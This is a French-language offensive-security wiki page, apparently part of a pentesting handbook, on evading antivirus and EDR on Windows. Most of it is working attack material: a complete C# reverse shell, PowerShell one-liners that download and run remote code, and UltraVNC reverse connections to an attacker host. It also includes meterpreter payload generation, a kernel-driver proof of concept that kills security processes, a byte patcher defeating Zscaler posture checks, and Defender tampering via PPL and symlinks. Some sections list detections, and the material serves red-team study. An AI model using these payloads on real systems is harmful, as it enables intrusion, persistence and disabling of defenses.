Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications téléchargées peu fréquemment déclencheront SmartScreen, alertant ainsi l'utilisateur final et l'empêchant d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) portant le nom Zone.Identifier, créé automatiquement lors du téléchargement de fichiers depuis internet, avec l'URL depuis laquelle ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification du flux ADS Zone.Identifier pour un fichier téléchargé depuis internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** **ne déclencheront pas SmartScreen**.

Une façon très efficace d'empêcher vos payloads d'obtenir le Mark of The Web consiste à les empaqueter à l'intérieur d'un conteneur comme un ISO. Cela se produit parce que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie afin de contourner le Mark-of-the-Web.

Exemple d'utilisation :
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démonstration de contournement de SmartScreen en empaquetant des payloads dans des fichiers ISO à l’aide de [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme de journalisation puissant dans Windows qui permet aux applications et aux composants système de **journaliser des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière qu’AMSI est désactivé (bypassé), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans journaliser d’événements. Cela se fait en patchant la fonction en mémoire pour qu’elle retourne immédiatement, ce qui désactive effectivement la journalisation ETW pour ce processus.

Vous pouvez trouver plus d’infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Le chargement de binaires C# en mémoire est connu depuis longtemps et reste une excellente méthode pour exécuter vos outils de post-exploitation sans vous faire repérer par l’AV.

Comme le payload sera chargé directement en mémoire sans toucher le disque, il ne faudra se soucier que du patching d’AMSI pour tout le processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la possibilité d’exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de le faire :

- **Fork\&Run**

Cela consiste à **spawn un nouveau processus sacrificiel**, injecter votre code malveillant de post-exploitation dans ce nouveau processus, exécuter votre code malveillant, puis, une fois terminé, tuer le nouveau processus. Cette méthode a à la fois ses avantages et ses inconvénients. L’avantage de la méthode fork and run est que l’exécution se fait **en dehors** du processus de votre implant Beacon. Cela signifie que si quelque chose tourne mal lors de votre action de post-exploitation ou si elle est détectée, il y a une **bien plus grande chance** que votre **implant survive.** L’inconvénient est que vous avez une **plus grande chance** d’être détecté par les **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s’agit d’injecter le code malveillant de post-exploitation **dans son propre processus**. De cette façon, vous pouvez éviter de créer un nouveau processus et de le faire scanner par l’AV, mais l’inconvénient est que si quelque chose tourne mal lors de l’exécution de votre payload, il y a une **bien plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si vous voulez en savoir plus sur le chargement des assemblies C#, consultez cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Vous pouvez aussi charger des Assemblies C# **depuis PowerShell**, consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et [la vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d’exécuter du code malveillant en utilisant d’autres langages en donnant à la machine compromise l’accès **à l’environnement interpréteur installé sur le partage SMB contrôlé par l’attaquant**.

En autorisant l’accès aux binaires de l’interpréteur et à l’environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** sur la machine compromise.

Le repo indique : Defender analyse toujours les scripts, mais en utilisant Go, Java, PHP, etc., nous avons **davantage de flexibilité pour contourner les signatures statiques**. Les tests avec des scripts de reverse shell aléatoires non obfusqués dans ces langages ont été concluants.

## TokenStomping

Token stomping est une technique qui permet à un attaquant de **manipuler le access token ou un produit de sécurité comme un EDR ou AV**, en lui réduisant ses privilèges afin que le processus ne meure pas mais n’ait pas les permissions nécessaires pour vérifier les activités malveillantes.

Pour éviter cela, Windows pourrait **empêcher les processus externes** d’obtenir des handles sur les tokens des processus de sécurité.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Comme décrit dans [**ce billet de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), il est facile de déployer Chrome Remote Desktop sur le PC d’une victime, puis de l’utiliser pour en prendre le contrôle et maintenir la persistance :
1. Téléchargez depuis https://remotedesktop.google.com/, cliquez sur "Set up via SSH", puis cliquez sur le fichier MSI pour Windows afin de télécharger le fichier MSI.
2. Exécutez l’installateur silencieusement sur la victime (admin requis) : `msiexec /i chromeremotedesktophost.msi /qn`
3. Retournez sur la page Chrome Remote Desktop et cliquez sur next. L’assistant vous demandera alors d’autoriser ; cliquez sur le bouton Authorize pour continuer.
4. Exécutez le paramètre donné avec quelques ajustements : `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Notez le paramètre pin qui permet de définir le pin sans utiliser l’interface graphique).


## Advanced Evasion

L’evasion est un sujet très complexe, parfois il faut prendre en compte de nombreuses sources de télémétrie sur un seul système, donc il est quasiment impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement contre lequel vous intervenez aura ses propres forces et faiblesses.

Je vous encourage fortement à aller voir cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94), afin d’acquérir une base sur des techniques de Advanced Evasion plus avancées.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

c’est aussi une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui **retirera des parties du binaire** jusqu’à **trouver quelle partie Defender** considère comme malveillante et vous la découper.\
Un autre outil faisant **la même chose est** [**avred**](https://github.com/dobin/avred) avec une offre web ouverte proposant le service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Jusqu’à Windows10, toutes les versions de Windows étaient livrées avec un **serveur Telnet** que vous pouviez installer (en tant qu’administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** lorsque le système est lancé et **exécutez-le** maintenant :
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (furtif) et désactiver le firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis : [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements bin, pas le setup)

**SUR L’HÔTE** : Exécutez _**winvnc.exe**_ et configurez le serveur :

- Activez l’option _Disable TrayIcon_
- Définissez un mot de passe dans _VNC Password_
- Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier _**UltraVNC.ini**_ **nouvellement** créé dans le **victim**

#### **Reverse connection**

L’**attacker** doit **exécuter sur** son **host** le binaire `vncviewer.exe -listen 5900` afin qu’il soit **préparé** à recevoir une connexion **VNC** reverse. Puis, sur la **victim** : démarrez le démon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Pour maintenir la discrétion, vous ne devez pas faire quelques choses

- Ne démarrez pas `winvnc` s’il est déjà en cours d’exécution, sinon vous déclencherez un [popup](https://i.imgur.com/1SROTTl.png). vérifiez s’il s’exécute avec `tasklist | findstr winvnc`
- Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire, sinon cela fera ouvrir [the config window](https://i.imgur.com/rfMQWcf.png)
- N’exécutez pas `winvnc -h` pour obtenir de l’aide, sinon vous déclencherez un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis : [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **xml payload** avec :
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Le défenseur actuel mettra fin au processus très rapidement.**

### Compiler notre propre reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier Revershell C#

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste des obfuscateurs C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utilisation de python pour des exemples d'injecteurs de build :

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Autres outils
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 a exploité un petit utilitaire console connu sous le nom de **Antivirus Terminator** pour désactiver les protections endpoint avant de déployer le ransomware. L’outil apporte son **propre driver vulnérable mais *signé*** et l’abuse pour exécuter des opérations kernel privilégiées que même les services AV Protected-Process-Light (PPL) ne peuvent pas bloquer.

Points clés
1. **Driver signé** : Le fichier livré sur le disque est `ServiceMouse.sys`, mais le binaire est en réalité le driver signé légitimement `AToolsKrnl64.sys` provenant du “System In-Depth Analysis Toolkit” d’Antiy Labs. Comme le driver porte une signature Microsoft valide, il se charge même lorsque Driver-Signature-Enforcement (DSE) est activé.
2. **Installation du service** :
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La première ligne enregistre le driver comme un **kernel service** et la seconde le démarre afin que `\\.\ServiceMouse` devienne accessible depuis user land.
3. **IOCTLs exposés par le driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept :
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works** :  BYOVD contourne entièrement les protections user-mode ; le code qui s’exécute dans le kernel peut ouvrir des processus *protégés*, les terminer, ou altérer des objets kernel indépendamment des fonctionnalités de durcissement PPL/PP, ELAM ou autres.

Detection / Mitigation
•  Activer la block list Microsoft des drivers vulnérables (`HVCI`, `Smart App Control`) afin que Windows refuse de charger `AToolsKrnl64.sys`.
•  Surveiller la création de nouveaux services *kernel* et alerter lorsqu’un driver est chargé depuis un répertoire world-writable ou n’est pas présent dans l’allow-list.
•  Surveiller les handles user-mode vers des objets device personnalisés suivis d’appels `DeviceIoControl` suspects.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applique localement des règles de device-posture et s’appuie sur Windows RPC pour communiquer les résultats aux autres composants. Deux choix de conception faibles rendent possible un bypass complet :

1. L’évaluation de posture se fait **entièrement côté client** (un booléen est envoyé au serveur).
2. Les endpoints RPC internes vérifient seulement que l’exécutable qui se connecte est **signé par Zscaler** (via `WinVerifyTrust`).

En **patchant quatre binaires signés sur disque**, les deux mécanismes peuvent être neutralisés :

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt :
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Après avoir remplacé les fichiers d’origine et redémarré la pile de services :

* **Tous** les contrôles de posture affichent **vert/conforme**.
* Les binaires non signés ou modifiés peuvent ouvrir les points de terminaison RPC de named-pipe (par ex. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L’hôte compromis obtient un accès illimité au réseau interne défini par les politiques Zscaler.

Cette étude de cas montre comment des décisions de confiance purement côté client et de simples vérifications de signature peuvent être contournées avec quelques patchs d’octets.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) impose une hiérarchie signer/level afin que seuls les processus protégés de niveau égal ou supérieur puissent se modifier mutuellement. En offensif, si vous pouvez lancer légitimement un binaire avec PPL activé et contrôler ses arguments, vous pouvez transformer une fonctionnalité bénigne (par ex. la journalisation) en primitive d’écriture contrainte, soutenue par PPL, contre des répertoires protégés utilisés par AV/EDR.

Ce qui fait qu’un processus s’exécute comme PPL
- L’EXE cible (ainsi que toute DLL chargée) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess en utilisant les flags : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Un niveau de protection compatible doit être demandé et correspondre au signer du binaire (par ex. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signers anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signers Windows). Des niveaux incorrects échoueront à la création.

Voir aussi une introduction plus large à PP/PPL et à la protection LSASS ici :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Utilitaire open-source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments à l’EXE cible) :
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Modèle d’utilisation :
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitif LOLBIN : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre pour écrire un fichier journal vers un chemin spécifié par l’appelant.
- Lorsqu’il est lancé comme processus PPL, l’écriture du fichier s’effectue avec le support PPL.
- ClipUp ne peut pas parser les chemins contenant des espaces ; utilisez des chemins courts 8.3 pour pointer vers des emplacements normalement protégés.

Aides pour chemins courts 8.3
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire un chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chaîne d’abus (abstraite)
1) Lancer le LOLBIN capable PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l’aide d’un launcher (par ex. CreateProcessAsPPL).
2) Passer l’argument de chemin de log de ClipUp pour forcer la création d’un fichier dans un répertoire AV protégé (par ex. Defender Platform). Utiliser des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l’AV pendant son exécution (par ex. MsMpEng.exe), programmer l’écriture au boot avant le démarrage de l’AV en installant un service auto-start qui s’exécute de manière fiable plus tôt. Valider l’ordre de démarrage avec Process Monitor (boot logging).
4) Au redémarrage, l’écriture soutenue par PPL se produit avant que l’AV ne verrouille ses binaires, ce qui corrompt le fichier cible et empêche le démarrage.

Exemple d’appel (chemins masqués/raccourcis pour la sécurité) :
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes et contraintes
- Vous ne pouvez pas contrôler le contenu exact que ClipUp écrit au-delà de l’emplacement ; le primitive est adapté à la corruption plutôt qu’à l’injection précise de contenu.
- Nécessite local admin/SYSTEM pour installer/démarrer un service et une fenêtre de reboot.
- Le timing est critique : la cible ne doit pas être ouverte ; l’exécution au boot évite les verrous de fichier.

Détections
- Création de processus de `ClipUp.exe` avec des arguments inhabituels, surtout parenté par des launchers non standard, autour du boot.
- Nouveaux services configurés pour auto-start de binaires suspects et démarrant systématiquement avant Defender/AV. Enquêter sur la création/modification de service avant des échecs de démarrage de Defender.
- File integrity monitoring sur les binaires Defender/Platform directories ; créations/modifications de fichiers inattendues par des processus avec des flags protected-process.
- Télémétrie ETW/EDR : rechercher des processus créés avec `CREATE_PROTECTED_PROCESS` et une utilisation anormale du niveau PPL par des binaires non-AV.

Contre-mesures
- WDAC/Code Integrity : restreindre quels binaires signés peuvent s’exécuter en tant que PPL et sous quels parents ; bloquer l’invocation de ClipUp hors contextes légitimes.
- Service hygiene : restreindre la création/modification des services auto-start et surveiller la manipulation de l’ordre de démarrage.
- S’assurer que Defender tamper protection et les protections early-launch sont activées ; enquêter sur les erreurs de démarrage indiquant une corruption binaire.
- Envisager de désactiver la génération des noms courts 8.3 sur les volumes hébergeant les outils de sécurité si cela est compatible avec votre environnement (tester soigneusement).

Références pour PPL et tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender choisit la platform à partir de laquelle il s’exécute en énumérant les sous-dossiers sous :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier avec la chaîne de version lexicographiquement la plus élevée (par ex. `4.18.25070.5-0`), puis démarre les processus du service Defender à partir de là (en mettant à jour les chemins du service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris les reparse points de répertoire (symlinks). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin inscriptible par l’attaquant et obtenir du DLL sideloading ou une perturbation du service.

Préconditions
- Local Administrator (nécessaire pour créer des répertoires/symlinks sous le dossier Platform)
- Capacité à reboot ou à forcer une reselection de la platform Defender (redémarrage du service au boot)
- Seuls les outils intégrés sont nécessaires (mklink)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais la sélection de sa platform fait confiance aux entrées de répertoire et choisit la version lexicographiquement la plus élevée sans vérifier que la cible résout vers un chemin protégé/de confiance.

Étapes par étapes (exemple)
1) Préparer une copie inscriptible du dossier platform actuel, par ex. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez un lien symbolique de répertoire de version supérieure à l’intérieur de Platform pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Déclenchement de la sélection (redémarrage recommandé):
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devez observer le nouveau chemin du processus sous `C:\TMP\AV\` et la configuration/registre du service reflétant cet emplacement.

Options de post-exploitation
- DLL sideloading/code execution: Déposez/remplacez des DLL que Defender charge depuis son répertoire d’application pour exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Supprimez le version-symlink afin qu’au prochain démarrage, le chemin configuré ne se résolve pas et que Defender échoue à démarrer:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Note that This technique does not provide privilege escalation by itself; it requires admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les red teams peuvent déplacer l’évasion à l’exécution hors du implant C2 et dans le module cible lui-même en hookant sa Import Address Table (IAT) et en redirigeant les APIs sélectionnées via du code position‑independent (PIC) contrôlé par l’attaquant. Cela généralise l’évasion au-delà de la petite surface d’API que beaucoup de kits exposent (par ex. CreateProcessA), et étend les mêmes protections aux BOFs et aux DLLs de post‑exploitation.

Approche générale
- Préparer un blob PIC à côté du module cible à l’aide d’un reflective loader (préfixé ou compagnon). Le PIC doit être autonome et position‑independent.
